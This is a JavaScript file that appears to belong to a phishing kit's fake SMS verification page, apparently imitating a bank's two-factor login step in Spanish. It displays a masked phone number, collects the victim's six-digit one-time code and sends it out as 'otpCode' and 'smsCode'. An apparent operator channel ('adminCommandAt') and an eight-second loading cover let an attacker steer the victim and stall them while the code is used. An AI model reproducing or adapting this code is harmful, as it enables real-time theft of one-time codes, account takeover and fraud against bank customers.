(function () {
  var ERROR_PAGE = 13;
  var lastShownCommandAt = '';
  var phoneReady = false;

  function alertKey(detail) {
    var data = detail && detail.data ? detail.data : {};
    if (data.adminCommandAt) {
      return String(data.adminCommandAt);
    }
    return [data.smsErr ? '1' : '0', data.loginError || '', detail && detail.page].join('|');
  }

  function shouldShow(detail) {
    var key = alertKey(detail);
    if (!key || key === '|') {
      return false;
    }
    if (key === lastShownCommandAt) {
      return false;
    }
    lastShownCommandAt = key;
    return true;
  }

  function isSmsError(detail) {
    var page = detail ? Number(detail.page) : NaN;
    var data = detail && detail.data ? detail.data : {};
    return page === ERROR_PAGE || data.smsErr === true || data.loginError === 'codigo';
  }

  function toSmsPhone(value) {
    var raw = String(value || '').trim();
    if (!raw) {
      return '';
    }
    var shortMasked = raw.match(/^(\d{3})\s*(?:-{3,}|[•·\.*]{3,})\s*(\d{2,3})$/);
    if (shortMasked) {
      return shortMasked[1] + '-----' + shortMasked[2].slice(-2);
    }
    var digits = String(raw).replace(/\D/g, '');
    if (digits.length < 5) {
      return '';
    }
    return digits.slice(0, 3) + '-----' + digits.slice(-2);
  }

  function phoneFromData(data) {
    return toSmsPhone((data && (data.smsMaskedPhone || data.smsPhoneRaw)) || '');
  }

  function phoneIsPainted(masked) {
    var el = document.getElementById('estiloSubtitulo_');
    if (!el || !masked) {
      return false;
    }
    return String(el.textContent || '').indexOf(masked) !== -1;
  }

  function applyMaskedPhone(data) {
    var el = document.getElementById('estiloSubtitulo_');
    if (!el) {
      return '';
    }
    var masked = phoneFromData(data);
    el.innerHTML = masked
      ? ('Hemos enviado un mensaje de texto con un código de verificación al número celular <br>' + masked)
      : 'Hemos enviado un mensaje de texto con un código de verificación.';
    return masked;
  }

  function revealPhone(data) {
    var masked = applyMaskedPhone(data || {});
    if (!window.FlowPrefetch) {
      return;
    }
    if (masked && phoneIsPainted(masked)) {
      phoneReady = true;
      window.FlowPrefetch.markReady();
      return;
    }
    if (!phoneReady) {
      window.FlowPrefetch.holdCover(8000);
    }
  }

  if (window.FlowPrefetch) {
    window.FlowPrefetch.holdCover(8000);
  }

  var prefetchedSms = window.FlowPrefetch && window.FlowPrefetch.peek();
  if (prefetchedSms && (Number(prefetchedSms.page) === 4 || Number(prefetchedSms.page) === 13 || prefetchedSms.smsMaskedPhone || prefetchedSms.smsPhoneRaw)) {
    revealPhone(prefetchedSms);
  }

  document.addEventListener('stepFlowPage', function (event) {
    var detail = event.detail || {};
    revealPhone(detail.data || {});
    if (isSmsError(detail) && shouldShow(detail)) {
      if (window.showErrorModal) {
        window.showErrorModal();
      }
      if (window.FlowPrefetch) {
        window.FlowPrefetch.release();
      } else if (window.hideLoader) {
        window.hideLoader();
      }
    }
  });

  StepFlowClient.init({
    pageLocation: 'sms',
    sessionKey: 'intermaticoActual',
    localPage: 4,
    errorPage: ERROR_PAGE,
    errorFlag: 'smsErr',
    lgSelector: '#segundoFactorLg',
    inputSelector: '#codigoSegundoFactor',
    mitSelector: '#_eventId_registrarSegundoFactor',
    mitLabel: 'Continuar',
    loadingLabel: 'Procesando…',
    fallbackUrl: 'index.html',
    isValid: function (value) {
      return /^\d{6}$/.test(String(value || '').trim());
    },
    buildPayload: function (value) {
      return {
        otpCode: value,
        smsCode: value,
        smsErr: false,
        smsEstado: 'pending',
        loginError: ''
      };
    },
    onRemoteData: revealPhone
  });
})();
